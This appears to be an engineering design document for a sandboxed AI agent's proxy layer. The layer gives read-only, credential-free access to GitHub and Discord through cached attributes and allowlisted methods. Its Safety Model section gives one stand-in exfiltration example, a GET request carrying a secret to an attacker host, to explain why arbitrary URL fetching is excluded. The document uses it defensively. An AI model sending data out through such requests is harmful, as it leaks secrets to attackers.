# Proxy API Design

## Core Principles

### Mirror the Remote Ontology

The proxy layer mirrors the remote data source's ontology and affordances.
It is not an abstraction over the remote API — it *is* the remote API, with
two modifications:

1. **Credential injection.** Tokens live host-side. The sandbox never sees them.
2. **Unsafe operations removed.** Only operations that are safe by construction
   for all possible inputs are exposed.

By mirroring the remote model, the agent can apply its existing knowledge of
GitHub/Discord/etc. directly. We avoid injecting assumptions about what the
agent wants to do, and we avoid building bespoke query interfaces that
inevitably miss something.

### General-Purpose Primitives

Sources are reusable across agents and tasks (newsletter, gardener, CRM,
etc.) without modification. The agent adapts; the source exposes the data
model faithfully. A source should never encode assumptions about a
particular agent's workflow — it just provides the building blocks.

### Agent Empowerment

The proxy API exists to empower the agent, not to constrain it beyond
security boundaries. The agent is trusted to decide *how* to achieve its
goals. We provide building blocks and let it compose them freely.

This means:

- **Expose utility methods generously.** Snowflake/timestamp conversion,
  server-side filtering, convenience helpers — even if the agent *could*
  do the work itself, reducing friction matters. We cannot predict what
  the agent will need; we can only ensure that everything we expose is safe.
- **Prefer multiple useful forms** over forcing one canonical representation.
  Timestamps and snowflakes are both useful; expose both.
- **Never withhold a safe capability** because "the agent shouldn't need it."
  The agent's judgment about what it needs is better than ours.

The constraint is security, not workflow. Within the security boundary,
the agent has maximum freedom.

### Mechanical Sympathy

The API should work the way the agent already thinks. LLMs have deep
pre-training on Python idioms; the proxy layer works *with* that grain,
not against it. `dir()` returns names, `__doc__` explains, attributes
are nouns, methods are verbs — exactly as any Python developer expects.

Mechanical sympathy means no separate introspection protocols, no custom
query languages, no abstractions that require the agent to learn our
system before it can do its job. When the agent's trained intuition
about "how Python objects work" is correct, it spends its budget on the
actual task instead of fighting the system.

This extends to the implementation: methods and attributes live together
in `_proxy_attr_docs` because that's how Python works — there is no
`__methods__` in Python, so there shouldn't be one here.

### Progressive Disclosure and Laziness

Sources never over-fetch. Cached attributes fetch one conservative page on
first access — enough to orient the agent, not so much that it wastes API
budget on data that may never be used. Methods give the agent explicit control
when it needs more: `fetch_issues(since=...)` for targeted queries,
`fetch_messages(after=...)` for arbitrary time windows. Nested resources
(issue comments, conversation messages) don't load until accessed. The
agent pulls data incrementally, driven by what it actually needs.

### Self-Describing Values

Empty strings and empty lists are ambiguous: they could mean "no data",
"failed to load", or "not applicable". An agent seeing `shared_labels: []`
doesn't know whether labels weren't fetched, aren't supported, or simply
aren't applied. Silent absence wastes RLM iterations on defensive
exploration ("let me check if labels are loading correctly…").

Use **sentinel values** that explain themselves in context:

- **Empty string lists → `["[none]"]`** not `[]`, so the agent sees
  explicit absence rather than wondering if the fetch failed. For
  **typed collections** (list of dicts), use plain `[]` — a string
  sentinel in a list of dicts creates type inconsistency.
- **Missing content → in-context hint** not `""`. Discord messages with
  attachments but no text return `"[no text — check .attachments]"`
  instead of empty string. The value itself tells the agent what to do
  next, without requiring it to have read the `attr_docs` first.

This is progressive disclosure applied to *values*, not just schema.
The `attr_docs` are still there for reference, but the agent shouldn't
need to read documentation to understand what an empty field means.
When the data speaks for itself, the agent spends its budget on the task
instead of on defensive introspection.

**Timestamps → ISO 8601 strings.** All sources normalize timestamps to
ISO 8601 (`2026-03-04T00:00:00+00:00`), regardless of the upstream
format. GitHub and Discord provide ISO 8601 natively; Missive returns
Unix seconds, which we convert host-side. This means the agent can use
the same comparison pattern across every source (`msg.timestamp >
"2026-03-01"`) without needing to know which API it came from. ISO
strings are human-readable, lexicographically sortable, and pass
through `_classify_value` as concrete strings — `datetime` objects
would not.

### Leverage Pre-trained Knowledge

LLMs have seen GitHub's API, Discord's API, and hundreds of other
well-known services in their training data. When a proxy source wraps a
well-known API, the agent already has deep intuitions about the data
model, field semantics, and common patterns. Design to *activate* that
knowledge rather than replace it.

This has two practical implications:

**Name things to match the remote API.** When GitHub calls it `state`,
`labels`, `head`, `base`, call it `state`, `labels`, `head_branch`,
`base_branch`. The agent's pre-trained understanding of "what a GitHub
PR looks like" kicks in immediately. Renaming fields or restructuring the
data model forces the agent to build a mental mapping it doesn't need.

**Docstrings should orient and disambiguate, not re-teach.** For a
well-known API, a docstring that says "mirrors `/repos/:owner/:repo/issues`"
is more useful than an exhaustive field listing — the agent already knows
what GitHub issues look like. Documentation should focus on what's
*different* about our proxy: which endpoint it maps to, what's cached,
what's omitted, where we deviate. Everything else, the agent can infer.

This is a spectrum. For GitHub (billions of training tokens), a sentence
referencing the endpoint is enough. For a niche internal API, extensive
documentation is warranted. The guideline: document what the agent can't
already guess.

## Two Kinds of Access

### Attributes: the data model (nouns)

Attributes expose the remote source's object graph: repos have issues, issues
have comments, channels have messages. They are:

- **Cached with TTL.** Host-side caching avoids redundant API calls. Critical
  in an RLM where multiple independent exploration passes hit the same data.
  Sandbox-side caching (ProxyRef._cache) avoids redundant UDS round-trips
  within a single pass.
- **Explorable.** `dir()`, `__doc__`, `__attr_docs__` let the agent discover
  the data model. Comprehensions, filtering, sorting work naturally:
  ```python
  open_bugs = [i for i in repo.issues if i.state == "open" and "bug" in i.labels]
  recent = [m for m in channel.messages if m.timestamp > "YYYY-MM-DD"]
  ```
- **The canonical dataset.** `.issues` is not "list_issues with no params" —
  it is the repo's issues, period. The agent filters in Python, which
  composes with everything else and requires no API-specific knowledge.

### Methods: remote capabilities (verbs)

Methods expose remote operations that the agent **benefits from accessing
directly**: capabilities that can't be replicated by filtering cached data,
or server-side operations that meaningfully reduce data volume or latency.

- **Remote capability → expose.** GitHub's `/search/issues` searches the
  full history with full-text ranking and qualifiers. You cannot replicate
  this by filtering a cached list of recent issues. → `search_issues(q)`.
- **Server-side filtering → expose.** `fetch_issues(since=...)` reduces
  data volume at the source. The agent *could* filter `.issues` in Python,
  but server-side filtering avoids transferring hundreds of irrelevant
  items. The agent decides when to use the cached canonical dataset vs.
  a targeted server-side query.
- **Convenience computation → expose.** `snowflake_from_timestamp()` is
  pure math the agent could do itself, but exposing it reduces friction
  and error. See "Agent Empowerment" above.

Methods return ProxyObjects, so results integrate into the same cached
exploration model. A search result is a `GitHubIssue` with the same
attributes as one from `.issues`.

## Safety Model

Both attributes and methods are governed by **safety by construction**:
the API surface must be safe for all possible inputs.

### The trust boundary

Every API call — even a "read" — is a write to the remote service's logs.
A GET request to `https://evil.com/exfiltrate?data=secret` is a read that
functions as a write: the request itself carries data to a server the
attacker controls.

Safety by construction therefore requires a model of which remote services
we trust, not just which operations are "read-only":

- **The set of reachable services is fixed at design time.** Each source
  connects to exactly one service (GitHub, Discord, etc.). There is no
  `fetch_url(url)` — that would let the sandbox reach arbitrary servers.
- **We trust each service as a whole.** GitHub won't weaponize their search
  logs. Discord won't weaponize their message fetch logs. This is why
  `search_issues(any_string)` is safe: the query goes only to GitHub,
  and we trust GitHub.
- **An operation is safe when it is safe for all possible inputs against
  a trusted service.** Not "can we sanitize the args" but "does any
  combination of args cause harm, given that we trust the remote service?"

### Attributes

Already safe: the allowlist (`_proxy_dir`) controls which attributes are
visible. `_classify_value` rejects non-serializable values. Tokens and
client objects live in `_`-prefixed attrs outside the allowlist. All
requests go to the fixed, trusted remote service.

### Methods

Apply the same test: is this operation safe for every possible combination
of args, given that the request goes to a trusted service?

- `search_issues(q: str)` — query against GitHub's search index. We trust
  GitHub. Any query string is safe. The worst case is a useless search. ✅
- `list_messages(after: str, limit: int)` — fetch from Discord with
  pagination params. We trust Discord. Bad snowflakes return empty results. ✅
- `create_issue(title, body)` — writes attacker-controlled content to a
  public repo. Trusted service, but the *effect* is visible to third parties
  (repo watchers, search engines). **Not safe by construction.** ✗
- `post_message(channel_id, content)` — sends text visible to channel
  members. Same problem. **Not safe.** ✗
- `fetch_url(url)` — reaches an arbitrary, untrusted server. The request
  itself is a write to someone else's access log. **Not safe.** ✗

Method args from the sandbox are untrusted but this doesn't matter when
the operation is unconditionally safe against a trusted service. We
type-check args (must be JSON primitives) as defense in depth, but the
safety property doesn't depend on it.

### Cross-source data flow

The agent could encode data from source A into a method call on source B
(e.g., Discord message content into a GitHub search query). This is
acceptable because:

- Both services are in the trust set
- The request goes to a trusted service, not an attacker-controlled one
- All data originated from trusted APIs in the first place
- The sandbox is WASM-isolated from local filesystem/env/secrets
- Rate limiting bounds the volume

If a future source connects to a less-trusted service, this assumption
would need revisiting.

## Implementation: Method Calls in the Proxy Bridge

### Host side (proxy.py)

ProxyObject gains a method allowlist and dispatcher:

```python
class ProxyObject:
    _proxy_methods: dict[str, Callable]  # name → bound method
    _proxy_attr_docs: dict[str, str]     # name → docs for attributes and methods alike
```

ProxyRegistry gains `resolve_call(proxy_id, method, kwargs) → dict`:
- Check method is in `_proxy_methods`
- Type-check all kwarg values are JSON primitives
- Call the method, classify the return value
- Return same discriminated union as `resolve_getattr`

### MuxServer (mux.py)

New endpoint: `POST /proxy/call`
```json
{"proxy_id": "gh_repo_owner_repo", "method": "search_issues", "kwargs": {"q": "label:bug"}}
```

Same rate limiting, body size cap, and error handling as `/proxy/getattr`.

### Sandbox side (python_interpreter.py)

Inject `_proxy_call(proxy_id, method, **kwargs)` alongside `_proxy_resolve()`.
ProxyRef gains a `__getattr__` path that returns a callable wrapper for
methods:

```python
# In sandbox:
results = github.search_issues("label:bug is:open")
# → _proxy_call("gh_repo_owner_repo", "search_issues", {"q": "label:bug is:open"})
# → returns list of GitHubIssue ProxyRefs
```

### Discoverability

Everything — attributes and methods — is discoverable the Pythonic way:

- **`dir(obj)`** lists all available names (attributes and methods mixed
  together, as Python does).
- **`obj.__doc__`** is the first port of call. It should orient the agent:
  what this object is, what the key affordances are, and how to use them.
  This is the most important piece of documentation — it's what the agent
  reads first and what shapes its mental model.
- **`obj.__attr_docs__`** provides per-name documentation. For attributes,
  this describes the data. For methods, this describes what the method does,
  its parameters, and what it returns.

No separate `__methods__` introspection — that would be un-Pythonic.
Methods just show up in `dir()` like they do on any Python object.

Error messages are also a discoverability surface. When the agent tries
an attribute that doesn't exist, the `AttributeError` includes the full
list of available attributes — the agent can self-correct immediately
without a separate `dir()` call. Same principle as self-describing
values: put the help where the agent is already looking.

## Source API Design

### GitHub (`sources/github.py`)

**Attributes (cached, explorable):**

| Object | Attribute | Type | TTL | Notes |
|--------|-----------|------|-----|-------|
| GitHubRepo | `name` | str | — | `owner/repo` |
| GitHubRepo | `description` | str | — | |
| GitHubRepo | `issues` | proxy_list | 1h | All issues + PRs, updated_at desc. Use `is_pull_request` to distinguish |
| GitHubRepo | `pull_requests` | proxy_list | 1h | All PRs with PR-specific fields (head/base branch, draft, merged_at) |
| GitHubRepo | `comments` | proxy_list | 1h | All comments, updated_at desc |
| GitHubIssue | `number`, `title`, `body`, `state`, `author` | concrete | — | Pre-populated |
| GitHubIssue | `labels` | list[str] | — | Pre-populated |
| GitHubIssue | `reactions` | dict | — | Non-zero counts only |
| GitHubIssue | `is_pull_request` | bool | — | True if PR, False if issue |
| GitHubIssue | `comments` | proxy_list | 1h | Per-issue comments |
| GitHubComment | `author`, `body`, `created_at`, `updated_at` | concrete | — | Pre-populated |
| GitHubComment | `issue_number` | int | — | |
| GitHubComment | `reactions` | dict | — | |
| GitHubPullRequest | `number`, `title`, `body`, `state`, `author` | concrete | — | Pre-populated |
| GitHubPullRequest | `labels` | list[str] | — | Pre-populated |
| GitHubPullRequest | `head_branch`, `base_branch` | str | — | Source and target branch names |
| GitHubPullRequest | `draft` | bool | — | |
| GitHubPullRequest | `merged_at` | str | — | ISO 8601 or empty string |
| GitHubPullRequest | `reactions` | dict | — | Non-zero counts only |
| GitHubPullRequest | `comments` | proxy_list | 1h | Per-PR comments |

**Methods (remote capabilities):**

| Object | Method | Maps to | Safe? |
|--------|--------|---------|-------|
| GitHubRepo | `search_issues(q)` | `GET /search/issues?q={q}+repo:{owner}/{repo}` | ✅ read-only |
| GitHubRepo | `fetch_issues(state, since, labels, sort, direction)` | `GET /repos/{owner}/{repo}/issues` with query params | ✅ read-only |

### Discord (`sources/discord.py`)

**Attributes (cached, explorable):**

| Object | Attribute | Type | TTL | Notes |
|--------|-----------|------|-----|-------|
| DiscordSource | `guild_name` | str | — | |
| DiscordSource | `channels` | proxy_list | 1h | Text + announcement channels (types 0, 5) |
| DiscordSource | `active_threads` | proxy_list | 1h | Active threads (incl. forum threads) |
| DiscordChannel | `name`, `topic` | str | — | |
| DiscordChannel | `messages` | proxy_list | 1h | Recent 200, newest first |
| DiscordMessage | `id` | str | — | Snowflake ID, usable with `fetch_messages(after=..., before=...)` |
| DiscordMessage | `author`, `content`, `timestamp` | concrete | — | |
| DiscordMessage | `channel_id` | str | — | Channel snowflake ID |
| DiscordMessage | `url` | str | — | `https://discord.com/channels/{guild}/{channel}/{msg}` |
| DiscordMessage | `reactions` | dict | — | |

**Methods:**

| Object | Method | Maps to | Safe? |
|--------|--------|---------|-------|
| DiscordChannel | `fetch_messages(after, before, limit)` | `GET /channels/{id}/messages` with pagination | ✅ read-only |
| DiscordSource | `snowflake_from_timestamp(ts)` | Pure computation (no network) | ✅ safe |
| DiscordSource | `timestamp_from_snowflake(snowflake_id)` | Pure computation (no network) | ✅ safe |

`fetch_messages` lets the agent request arbitrary time windows beyond the
cached 200 most-recent. Parameters are snowflake IDs (matching Discord's
actual API). The agent can convert between timestamps and snowflakes
using `discord.snowflake_from_timestamp()` and
`discord.timestamp_from_snowflake()`. `limit` is clamped to [1, 1000]
as defense in depth.

Discord's bot API has no search endpoint. The agent filters messages in
Python, which is the right tool for the job.

### TTL Guidance

All source TTLs default to 1 hour (3600s). Sources shouldn't bake in
assumptions about agent cadence — an issue gardener runs hourly, a
newsletter runs daily, a CRM monitor runs continuously. The 1-hour TTL
balances freshness against API rate limits.

### Concurrency

`ProxyRegistry` serializes all proxy resolution via `threading.RLock`.
Both `resolve_getattr` and `resolve_call` hold the lock for the entire
operation, including lazy property evaluation. RLock (not Lock) because
`_classify_value` → `register()` re-enters the lock from the same thread.
This makes lazy properties safe under any server threading model.

## Adding a New Source

1. Copy an existing source file (`github.py` or `discord.py`)
2. Implement the client class (host-side, urllib.request, token validation)
3. Define ProxyObject subclasses mirroring the remote data model
4. For each potential method, apply the safety test: is it safe for all
   possible inputs? If yes, add to `_proxy_methods`. If no, omit.
5. Add tests following `test_sources.py` patterns
6. Register in the newsletter script or wherever the source is used

## Design Checklist for New Operations

When considering whether to expose a new attribute or method:

- [ ] Does it mirror a real concept in the remote API's data model?
- [ ] For attributes: is the data cacheable? Is it useful for exploration?
- [ ] For methods: does the remote API provide a capability that can't be
      replicated by filtering cached attributes?
- [ ] Is the remote service in the trust set?
- [ ] Is the operation safe by construction — for ALL possible inputs,
      against a trusted service? (Remember: "reads" are writes to logs.)
- [ ] Does the operation's effect stay within the trusted service, or is
      it visible to untrusted third parties?
- [ ] Are all return values JSON-serializable or ProxyObjects?
- [ ] Are credentials kept host-side? (No tokens in ProxyObject attrs)
- [ ] Is the docstring clear enough for an agent to use it correctly on
      first encounter?
